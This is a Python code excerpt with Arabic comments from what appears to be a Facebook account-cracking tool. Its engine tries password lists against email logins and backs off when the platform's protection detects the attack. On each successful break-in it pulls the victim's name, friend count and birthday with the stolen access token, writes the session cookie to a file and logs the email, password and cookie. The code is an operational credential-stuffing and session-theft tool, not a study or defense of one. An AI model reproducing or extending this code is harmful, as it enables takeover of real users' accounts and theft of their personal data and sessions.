# [16] محرك سحب البيانات التفصيلية (ACCOUNT INFO EXTRACTOR)
class MohaDataExtractor:
    def __init__(self):
        self.base_url = "https://graph.facebook.com/v17.0/me"

    def get_details(self, token):
        """سحب عدد الأصدقاء، الاسم الحقيقي، وتاريخ الميلاد إن وجد"""
        if not token or token == "NO_TOKEN": return "N/A"
        try:
            params = {
                "access_token": token,
                "fields": "name,friends.summary(true),birthday,created_time"
            }
            res = requests.get(self.base_url, params=params, timeout=7).json()
            name = res.get("name", "Unknown")
            friends = res.get("friends", {}).get("summary", {}).get("total_count", 0)
            return f"Name: {name} | Friends: {friends}"
        except:
            return "Info Error"

# [17] نظام استخراج وحفظ الكوكيز (COOKIE ENGINE)
class MohaCookieManager:
    def __init__(self):
        self.path = "MOHA_FB/cookies/"
        if not os.path.exists(self.path): os.makedirs(self.path)

    def export_cookie(self, email, cookie_string):
        """حفظ الكوكيز في ملف نصي مستقل لكل حساب OK"""
        filename = f"{self.path}{email}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write(cookie_string)

# [18] تحديث نظام المزامنة للنتائج النهائية (FINAL SYNC UPDATED)
class MohaFinalSync(MohaSync):
    def __init__(self, vault, fb, scanner):
        super().__init__(vault, fb, scanner)
        self.extractor = MohaDataExtractor()
        self.cookie_man = MohaCookieManager()

    def fire_engine(self, email, pws, total):
        """تعديل عملية الهجوم لتشمل فحص الألعاب والمعلومات والكوكيز"""
        for password in pws:
            status, token, cookie = self.fb.login(email, password)
            
            with self.lock:
                if status == "OK":
                    self.oks += 1
                    # 1. فحص الألعاب
                    games = self.scanner.scan_games(token)
                    # 2. فحص معلومات الحساب (الأصدقاء)
                    details = self.extractor.get_details(token)
                    # 3. حفظ الكوكيز
                    self.cookie_man.export_cookie(email, cookie)
                    
                    # طباعة النتيجة الاحترافية الكاملة
                    print(f"\r{G}[MOHA-OK] {W}{email} | {password}{X}")
                    print(f"{G} > {C}{details} | {Y}Games: {games}{X}")
                    
                    self.vault.save_hit("OK", email, password, f"{details} | Games: {games} | Cookie: {cookie}")
                    break # التوقف عن تجربة بقية الباسوردات لهذا الإيميل
                
                elif status == "CP":
                    self.cps += 1
                    print(f"\r{Y}[MOHA-CP] {email} | {password}{X}")
                    self.vault.save_hit("CP", email, password)
                    break # التوقف لضمان عدم قفل الحساب نهائياً
                
                elif status == "BLOCK":
                    print(f"\r{R}[!] نظام الحماية كشف الهجوم.. انتظر قليلاً..{X}", end="")
                    time.sleep(20)

            self.loop += 1
            sys.stdout.write(f"\r {W}[MOHA-02] {self.loop}/{total} | {G}OK:{self.oks} {Y}CP:{self.cps}{X}")
            sys.stdout.flush()

